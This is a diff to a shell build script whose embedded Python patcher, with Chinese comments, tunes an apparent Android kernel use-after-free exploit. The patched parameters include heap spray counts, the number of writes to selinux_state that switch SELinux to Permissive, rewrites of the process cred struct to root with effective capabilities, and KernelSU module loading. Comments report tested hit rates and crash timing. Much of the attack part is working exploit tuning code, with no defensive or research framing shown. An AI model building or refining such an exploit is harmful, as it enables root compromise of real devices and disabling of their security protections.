@@ -80,10 +80,12 @@ patch_macro "$T/ctest.c" BLOB_SITE_A "$BLOB_A"
 patch_macro "$T/ctest.c" BLOB_SITE_B "$BLOB_B"
 grep -E "^#define[[:space:]]+(LINK_|CRED_SITE|BLOB_SITE)" "$T/ctest.c" | sed 's/^/  ctest.c: /'
 
-# —— 策略补丁（ctest.c + uaf_write.inc）——
-# 关键约束：写 selinux_state 次数越少越稳（实测多次写 1 秒内即崩，
-# 单次写可稳定存活 80s+）。因此把 try_permissive / try_initialized
-# 的重试都压到 2 次，并把写原语参数改为实测命中值。
+# —— 策略补丁（审核后最小写版本）——
+# 依据审核结论：
+#   - 单次 UAF 写可靠（E2：写 sysctl_bootid 命中、enforce 保持 Enforcing、60s 无重启）；
+#   - 多字段连写是风险来源（E1：未开窗却变 Permissive → 某次写打偏）；
+#   - loader 进程内 finit_module/setenforce 只查 effective 能力 → 不再写 permitted/ambient。
+# 因此：删掉 patch_full_caps，patch_agent 重试 10→4，其余保持。
 python3 - "$T/ctest.c" "$T/uaf_write.inc" "$SPRAY_N" "$SPREAD_MS" <<'PY'
 import io
 import re
@@ -99,7 +101,7 @@ def sub_n(text, old, new, what, want):
         raise SystemExit("补丁失败：%s 期望 %d 次，实际 %d 次" % (what, want, n))
     return text.replace(old, new)
 
-# uaf_write.inc：单次写带间隔 + 延长上报后等待
+# uaf_write.inc：写原语带间隔（实测命中参数）
 u = sub_n(u, "spray_fire(spray_n, spray_buf);",
           "spray_spread(spray_n, %s, spray_buf);" % spread_ms,
           "uaf_write_once 改用 spray_spread", 1)
@@ -108,14 +110,13 @@ u = sub_n(u, "usleep(40000);", "usleep(150000);", "上报后等待 150ms", 1)
 # ctest.c：默认 spray 数
 c = sub_n(c, "long spray = 1024;", "long spray = %s;" % spray_n, "spray 默认值", 2)
 
-# permissive / initialized 的重试次数：8 -> 2
-c = sub_n(c, "for (int t = 0; t < 8; t++) {", "for (int t = 0; t < 2; t++) {",
-          "permissive/initialized 重试 8→2", 2)
-# chain_fast 内 initialized 循环：6 -> 2
-c = sub_n(c, "for (int i = 0; i < 6; i++) {", "for (int i = 0; i < 2; i++) {",
-          "chain_fast initialized 循环 6→2", 1)
+# selinux 写相关的重试全部压到 1（默认不写：env 未设时不会执行）
+c = sub_n(c, "for (int t = 0; t < 8; t++) {", "for (int t = 0; t < 1; t++) {",
+          "permissive/initialized 重试 8→1", 2)
+c = sub_n(c, "for (int i = 0; i < 6; i++) {", "for (int i = 0; i < 1; i++) {",
+          "chain_fast initialized 循环 6→1", 1)
 
-# 两处 selinux 写都用命中参数
+# 两处 selinux 写都用命中参数，且 installed 写由 env 控制
 c = sub_n(c, "uaf_write_once(st, 1024, 1);",
           "uaf_write_once(st, %s, 1);" % spray_n, "permissive 写参数", 1)
 c, n = re.subn(r"uaf_write_once\(st \+ 1, 1024, 0\);",
@@ -123,23 +124,21 @@ c, n = re.subn(r"uaf_write_once\(st \+ 1, 1024, 0\);",
 if n != 2:
     raise SystemExit("补丁失败：initialized 写期望 2 次，实际 %d 次" % n)
 
-# cred：uid/euid/fsuid 全改 + 补 permitted/ambient
+# cred 改写：uid/euid/fsuid + cap_eff（不再补 permitted/ambient）
 c = sub_n(c, "    patch_agent(pid, cred, 0, 1);\n",
-          "    patch_agent(pid, cred, 1, 1);\n    patch_full_caps(pid, cred);\n",
-          "chain_fast 改 root + patch_full_caps", 1)
+          "    patch_agent(pid, cred, 1, 1);\n",
+          "chain_fast 改 root（不再 patch_full_caps）", 1)
 c = sub_n(c, "    for (int r = 0; r < 10; r++) {\n        long t0 = now_ms();\n",
-          "    for (int r = 0; r < 40; r++) {\n        long t0 = now_ms();\n",
-          "patch_agent 轮数 40", 1)
-c = sub_n(c, "for (int r = 0; r < 12 && !(li && lp && lb && la); r++)",
-          "for (int r = 0; r < 40 && !(li && lp && lb && la); r++)", "caps 轮数 40", 1)
+          "    for (int r = 0; r < 4; r++) {\n        long t0 = now_ms();\n",
+          "patch_agent 轮数 10→4", 1)
 
-# 装载：交给 c99491_load（由 -e 指定），ctest 只发无副作用命令
+# 装载交给 c99491_load（由 -e 指定）
 c = sub_n(c, "        int n = snprintf(c, sizeof(c), \"loadksu %#llx allow_shell=1\\n\", slide);",
           "        int n = snprintf(c, sizeof(c), \"id\\n\");", "loadksu -> id", 2)
 
 io.open(ctest_path, "w", encoding="utf-8").write(c)
 io.open(inc_path, "w", encoding="utf-8").write(u)
-print("策略补丁已应用：spray=%s/%s，permissive 重试 2，initialized 2" % (spray_n, spread_ms))
+print("策略补丁已应用：spray=%s/%s，selinux 重试 1，patch_agent 4 轮，无 patch_full_caps" % (spray_n, spread_ms))
 PY
 
 # —— Android system_properties 垫片 ——
@@ -205,7 +204,7 @@ build tinycred      "$T/tinycred.c"
   echo "blob_site_b=$BLOB_B"
   echo "spray_n=$SPRAY_N"
   echo "spread_ms=$SPREAD_MS"
-  echo "patches=spray-spread,permissive-retry2,cred-root+caps40,loadksu-id,c99491_load"
+  echo "patches=spray-spread,selinux-retry1,patch_agent4,no-full-caps,loadksu-id,c99491_load"
   echo "built_at=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
   for f in "$OUT"/*; do
     case "$f" in *.b64|*.txt) continue;; esac
